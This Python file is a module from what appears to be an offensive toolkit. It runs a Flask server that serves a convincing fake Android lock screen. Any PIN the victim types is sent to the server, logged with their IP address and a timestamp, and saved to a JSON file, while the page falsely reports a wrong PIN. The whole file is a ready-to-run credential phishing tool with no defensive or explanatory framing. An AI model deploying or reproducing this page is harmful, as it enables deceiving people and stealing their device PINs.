import os
import sys
import json
import time
from flask import Flask, render_template_string, request, jsonify
from core.promptui import *

app = Flask(__name__)
PIN_LEN = 6
DATA_JSON_FILE = "pin_captures.json"
active_visitors = {}

ANDROID_PIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Android Device Lock Screen</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            user-select: none;
            -webkit-user-select: none;
        }
        .keypad-btn {
            background-color: rgba(255, 255, 255, 0.08);
            transition: background-color 0.2s, transform 0.1s;
        }
        .keypad-btn:active {
            background-color: rgba(255, 255, 255, 0.2);
            transform: scale(0.95);
        }
        .pin-dot {
            width: 14px;
            height: 14px;
            border-radius: 50%;
            border: 2px solid rgba(255, 255, 255, 0.4);
            transition: all 0.2s ease;
        }
        .pin-dot.filled {
            background-color: #ffffff;
            border-color: #ffffff;
        }
    </style>
</head>
<body class="flex flex-col items-center justify-between min-h-screen py-12 px-6">
    <div class="text-center mt-4">
        <div class="text-5xl font-light mb-2 tracking-wide" id="clock">12:00</div>
        <div class="text-sm text-gray-400 font-medium" id="status-text">Enter PIN</div>
    </div>

    <div class="w-full max-w-xs flex flex-col items-center space-y-8 my-auto">
        <!-- PIN Dots Indicator -->
        <div class="flex justify-center items-center space-x-4 h-8" id="pin-dots-container">
            <!-- Dynamically populated -->
        </div>

        <div id="error-msg" class="text-red-400 text-xs text-center hidden h-4">Wrong PIN. Try again.</div>

        <!-- Numeric Keypad Grid -->
        <div class="grid grid-cols-3 gap-5 w-64">
            <button type="button" class="keypad-btn w-16 h-16 rounded-full text-2xl font-normal flex items-center justify-center mx-auto shadow-md" onclick="pressKey('1')">1</button>
            <button type="button" class="keypad-btn w-16 h-16 rounded-full text-2xl font-normal flex items-center justify-center mx-auto shadow-md" onclick="pressKey('2')">2</button>
            <button type="button" class="keypad-btn w-16 h-16 rounded-full text-2xl font-normal flex items-center justify-center mx-auto shadow-md" onclick="pressKey('3')">3</button>
            <button type="button" class="keypad-btn w-16 h-16 rounded-full text-2xl font-normal flex items-center justify-center mx-auto shadow-md" onclick="pressKey('4')">4</button>
            <button type="button" class="keypad-btn w-16 h-16 rounded-full text-2xl font-normal flex items-center justify-center mx-auto shadow-md" onclick="pressKey('5')">5</button>
            <button type="button" class="keypad-btn w-16 h-16 rounded-full text-2xl font-normal flex items-center justify-center mx-auto shadow-md" onclick="pressKey('6')">6</button>
            <button type="button" class="keypad-btn w-16 h-16 rounded-full text-2xl font-normal flex items-center justify-center mx-auto shadow-md" onclick="pressKey('7')">7</button>
            <button type="button" class="keypad-btn w-16 h-16 rounded-full text-2xl font-normal flex items-center justify-center mx-auto shadow-md" onclick="pressKey('8')">8</button>
            <button type="button" class="keypad-btn w-16 h-16 rounded-full text-2xl font-normal flex items-center justify-center mx-auto shadow-md" onclick="pressKey('9')">9</button>
            <div></div>
            <button type="button" class="keypad-btn w-16 h-16 rounded-full text-2xl font-normal flex items-center justify-center mx-auto shadow-md" onclick="pressKey('0')">0</button>
            <button type="button" class="w-16 h-16 rounded-full text-lg flex items-center justify-center mx-auto text-gray-400 hover:text-white transition" onclick="deleteKey()">
                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2M3 12l6.414-6.414a2 2 0 011.414-.586H19a2 2 0 012 2v10a2 2 0 01-2 2h-8.172a2 2 0 01-1.414-.586L3 12z"/>
                </svg>
            </button>
        </div>
    </div>

    <div class="text-xs text-gray-500 mb-4 tracking-wider uppercase font-semibold">Emergency Call</div>

    <script>
        const pinLen = {{ pin_len }};
        let currentPin = '';
        const dotsContainer = document.getElementById('pin-dots-container');
        const errorMsg = document.getElementById('error-msg');
        const statusText = document.getElementById('status-text');

        // Build dots
        for (let i = 0; i < pinLen; i++) {
            const dot = document.createElement('div');
            dot.className = 'pin-dot';
            dot.id = `dot-${i}`;
            dotsContainer.appendChild(dot);
        }

        function updateClock() {
            const now = new Date();
            let hours = now.getHours();
            let minutes = now.getMinutes();
            minutes = minutes < 10 ? '0' + minutes : minutes;
            document.getElementById('clock').innerText = `${hours}:${minutes}`;
        }
        setInterval(updateClock, 1000);
        updateClock();

        function pressKey(num) {
            if (currentPin.length < pinLen) {
                currentPin += num;
                updateDots();
                errorMsg.classList.add('hidden');

                if (currentPin.length === pinLen) {
                    verifyPin();
                }
            }
        }

        function deleteKey() {
            if (currentPin.length > 0) {
                currentPin = currentPin.slice(0, -1);
                updateDots();
                errorMsg.classList.add('hidden');
            }
        }

        function updateDots() {
            for (let i = 0; i < pinLen; i++) {
                const dot = document.getElementById(`dot-${i}`);
                if (i < currentPin.length) {
                    dot.classList.add('filled');
                } else {
                    dot.classList.remove('filled');
                }
            }
        }

        function verifyPin() {
            fetch('/capture-pin', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ pin: currentPin })
            })
            .then(res => res.json())
            .then(data => {
                setTimeout(() => {
                    errorMsg.classList.remove('hidden');
                    currentPin = '';
                    updateDots();
                }, 500);
            })
            .catch(err => {
                currentPin = '';
                updateDots();
            });
        }

        setInterval(function() {
            navigator.sendBeacon('/heartbeat');
        }, 5000);
    </script>
</body>
</html>
"""

def save_capture(data):
    records = []
    if os.path.exists(DATA_JSON_FILE):
        try:
            with open(DATA_JSON_FILE, "r") as f:
                records = json.load(f)
        except:
            pass
    records.append(data)
    with open(DATA_JSON_FILE, "w") as f:
        json.dump(records, f, indent=4)

@app.route('/')
def index():
    return render_template_string(ANDROID_PIN_TEMPLATE, pin_len=PIN_LEN)

@app.route('/capture-pin', methods=['POST'])
def capture_pin():
    req = request.get_json()
    ip = request.remote_addr
    pin = req.get('pin', 'N/A')
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

    print(f"\n{PromptUi.result} [PIN CAPTURED] IP: {ip} | PIN: \033[1;32m{pin}\033[0m | Time: {timestamp}")
    save_capture({"ip": ip, "pin": pin, "timestamp": timestamp})
    return jsonify({"status": "success"})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    ip = request.remote_addr
    if ip not in active_visitors:
        print(f"{PromptUi.result} New Visitor Detected -> {ip}")
    active_visitors[ip] = time.time()
    return "", 204

class Module:
    def __init__(self):
        self.info = {
            'name': 'Android Lock Screen PIN Phishing',
            'description': 'Generates an authentic Android lock screen PIN keypad verification page with custom length.',
            'author': 'Quwais',
            'options': {
                'PIN_LENGTH': {
                    'default': '6',
                    'required': True,
                    'desc': 'Length of the PIN (e.g., 4, 6)'
                },
                'PORT': {
                    'default': '8080',
                    'required': True,
                    'desc': 'Local port to run the phishing server'
                }
            }
        }

    def run(self, options):
        global PIN_LEN
        if os.geteuid() != 0:
            print(f"{PromptUi.error} This module requires root access.")
            return

        try:
            PIN_LEN = int(options.get('PIN_LENGTH', 6))
        except ValueError:
            PIN_LEN = 6

        try:
            port = int(options.get('PORT', 8080))
        except ValueError:
            port = 8080

        print(f"{PromptUi.info} Starting Android Lock Screen PIN Phishing server...")
        print(f"{PromptUi.info} Configured PIN Length: {PIN_LEN} digits")
        print(f"{PromptUi.info} Listening on port {port}...")
        print(f"{PromptUi.result} Waiting for visitor interaction...\n")

        try:
            app.run(host='0.0.0.0', port=port, debug=False)
        except Exception as e:
            print(f"{PromptUi.error} Error running server: {e}")
